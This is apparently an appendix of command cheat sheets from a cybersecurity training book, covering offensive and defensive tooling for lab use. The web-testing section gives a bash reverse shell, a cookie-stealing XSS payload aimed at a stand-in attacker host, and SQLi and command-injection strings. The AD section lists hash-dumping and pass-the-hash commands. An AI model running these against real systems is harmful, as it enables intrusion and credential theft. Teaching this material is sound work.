# Appendix A · Command and Tool Cheat Sheets

> **How to use this:** These are quick references, not learning material — build your understanding in the chapters, then use this to recall syntax. ⚠️ Every offensive command here is for your lab, permission-granting platforms, or authorized targets only (Chapter 3). Build your *own* cheat sheets from real use (Chapter 1) — that's when they become yours.

---

## A.1 Linux essentials (Chapter 5)

```bash
# Navigation & inspection
ls -la                 # list all, long format (shows hidden .files)
find / -name "*.conf" 2>/dev/null      # find by name, hide errors
find / -perm -4000 2>/dev/null         # find SUID binaries (privesc)
grep -rin "password" /etc/             # recursive, case-insensitive, line numbers
file suspicious                        # identify real file type
stat file                              # all timestamps/metadata

# Process & network state
ps aux                                 # all processes
ss -tulpn                              # listening ports + owning process
lsof -i                                # open network files
systemctl status <svc>                 # service state
journalctl -u ssh --since "1 hour ago" # systemd logs

# Users & privilege
id ; whoami ; who ; w                  # identity & who's logged in
sudo -l                                # what can I run as root? (first check!)
cat /etc/passwd                        # accounts
awk -F: '{print $1}' /etc/passwd       # just usernames

# Log analysis one-liners
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
# ^ top sources of failed SSH logins

# Permissions
chmod 640 file          # rw-r-----   (4=r,2=w,1=x per triad)
chmod u+s file          # set SUID
chown user:group file
```

---

## A.2 Networking & scanning (Chapters 7, 15)

```bash
# nmap
nmap -sn 10.0.0.0/24               # ping sweep (host discovery)
nmap -sS -p- 10.0.0.5              # SYN scan, ALL 65535 ports
nmap -sV -sC -O 10.0.0.5           # versions + default scripts + OS
nmap -A -T4 10.0.0.5               # aggressive
nmap -sU --top-ports 50 10.0.0.5   # UDP scan
nmap --script vuln 10.0.0.5        # NSE vuln scripts

# DNS / recon
dig example.com ANY ; dig axfr @ns example.com   # records / zone transfer attempt
nslookup example.com
whatweb http://target                            # tech fingerprint

# Packet capture
tcpdump -i eth0 -w cap.pcap port 80
# Wireshark display filters: http | tcp.port==443 | ip.addr==10.0.0.5 | dns

# Content discovery
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dir -u http://target -w wordlist.txt

# Connectivity / transfer
curl -I https://target        # headers only
nc -lvnp 4444                 # listener (catch reverse shell)
```

---

## A.3 Web testing quick refs (Chapter 16)

```
# Reverse shell (from a lab RCE) — attacker listens: nc -lvnp 4444
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

# Classic test payloads (understand them — Chapter 16)
SQLi auth bypass:   ' OR '1'='1' --
SQLi union:         ' UNION SELECT username,password FROM users -- -
XSS:                <script>fetch('//attacker/'+document.cookie)</script>
Command injection:  ; id     |     `id`     $(id)
SSRF target:        http://169.254.169.254/  (cloud metadata — Ch 26)

# Burp Suite workflow: Proxy (intercept) → Repeater (manual tweak) → Intruder (fuzz)
# sqlmap (authorized only): sqlmap -u "http://target/item?id=1" --batch --dbs
```

---

## A.4 Password cracking (Chapters 11, 17)

```bash
# Identify then crack (only hashes you're authorized to crack)
hashcat -m 0 hashes.txt rockyou.txt              # -m 0 = MD5 (see modes list)
hashcat -m 1000 nt_hashes.txt rockyou.txt -r rules/best64.rule   # NTLM + rules
john --wordlist=rockyou.txt hashes.txt
john --format=NT hashes.txt

# Kerberoast hash cracking (Ch 18)
hashcat -m 13100 kerb.hash rockyou.txt
```

---

## A.5 Windows / Active Directory (Chapters 6, 18)

```powershell
# Windows (PowerShell) — defensive/enumeration
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 20
Get-LocalGroupMember -Group "Administrators"
Get-ADUser -Filter * ; Get-ADGroupMember "Domain Admins"
```
```bash
# AD attacks (impacket / linux — LAB ONLY)
impacket-GetUserSPNs domain/user:pass -dc-ip 10.0.0.1 -request   # Kerberoast
impacket-secretsdump domain/user:pass@10.0.0.1                    # dump hashes
nxc smb 10.0.0.0/24 -u user -H <NThash>                           # Pass-the-Hash sweep
impacket-psexec domain/user@10.0.0.5 -hashes :<NThash>            # PtH exec
# BloodHound: run SharpHound collector → import → "Shortest Path to Domain Admins"
```

Key Windows Event IDs: 4624 logon · 4625 failed logon · 4688 process creation · 4672 special privs · 4768/4769 Kerberos TGT/TGS · 4720 account created · 7045 new service.

---

## A.6 Blue team / SIEM queries (Chapters 20–21)

```
# Splunk SPL
index=windows EventCode=4625 | stats count by src_ip,Account_Name | sort -count

# Microsoft Sentinel KQL
SecurityEvent | where EventID == 4625 | summarize count() by IpAddress,Account | sort by count_ desc

# Sigma rule skeleton (Ch 21) — convert to any SIEM
detection:
  selection:
    ParentImage|endswith: ['\winword.exe','\excel.exe']
    Image|endswith: '\powershell.exe'
  condition: selection

# YARA skeleton (Ch 21/24)
rule Example { strings: $a="badstring" nocase  condition: $a }

# Validate detections: Atomic Red Team → run atomic test → confirm alert fires
```

---

## A.7 Forensics & malware (Chapters 23–24)

```bash
# Disk imaging (preserve integrity)
dd if=/dev/sdb of=image.dd bs=4M ; sha256sum /dev/sdb image.dd   # hash source & image
foremost -i image.dd -o out/        # file carving (recover deleted)

# Memory (Volatility 3)
vol -f mem.raw windows.pslist       # processes
vol -f mem.raw windows.netscan      # network connections
vol -f mem.raw windows.malfind      # injected code

# Malware static triage (isolated VM!)
strings -n 8 sample | less          # readable strings (URLs, C2)
sha256sum sample                    # hash → VirusTotal (public samples only)
# PE inspection: PEStudio / pefile ; packer: Detect It Easy ; RE: Ghidra
```

---

## A.8 Cloud, containers, DevSecOps (Chapters 26–28)

```bash
# Cloud auditing (your own accounts)
prowler aws                         # CSPM scan (misconfigs)
scoutsuite aws                      # multi-cloud audit
# AWS: enable CloudTrail, set billing alert, MFA on root — FIRST

# Containers / K8s
trivy image myimage:tag             # scan image for CVEs + secrets
kube-bench                          # CIS Kubernetes benchmark
kube-hunter                         # find K8s vulnerabilities
# Falco = runtime container detection

# DevSecOps pipeline scanners
semgrep --config auto .             # SAST
gitleaks detect                     # secret scanning (incl. git history)
checkov -d .                        # IaC misconfig scan (Terraform/K8s)
syft dir:.                          # generate SBOM
cosign sign / cosign verify         # artifact/image signing
```

---

## A.9 Python security snippets (Chapter 8)

```python
# TCP port check (the handshake, Ch 7)
import socket
s = socket.socket(); s.settimeout(1)
print("OPEN" if s.connect_ex(("127.0.0.1", 80)) == 0 else "closed")

# HTTP / API
import requests
r = requests.get(url, headers={"Authorization": f"Bearer {token}"})

# Extract IPs from a log
import re
ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', open("access.log").read())

# Key libs: scapy (packets), impacket (AD), pwntools (exploit), cryptography (crypto)
```

---

## A.10 "First moves" checklists

**Landed a shell on Linux (privesc — Ch 17):** `id` → `sudo -l` → `find / -perm -4000 2>/dev/null` → check cron (`/etc/cron*`), writable files, `.bash_history`, configs for creds → run LinPEAS → check kernel version.

**Landed on Windows (privesc — Ch 17):** `whoami /priv` → `whoami /groups` → run WinPEAS → check service permissions, unquoted paths, `SeImpersonatePrivilege`, stored creds, AlwaysInstallElevated.

**New target enumeration (Ch 15):** `nmap -sn` (discovery) → `nmap -p- -sV -sC` (full) → per-service deep enum (SMB shares, web dirs, versions → CVEs) → note *everything*.

**Triaging a SOC alert (Ch 20/22):** What fired & why? → pull context (process tree, user, host, network) → true/false positive? → scope (other affected?) → contain if real → escalate with a written timeline.

**Investigating a suspicious file (Ch 24):** Isolated VM + snapshot → hash + VT (public only) → `strings` → PE imports → (if needed) detonate with ProcMon/Wireshark/FakeNet → extract IOCs → write YARA.
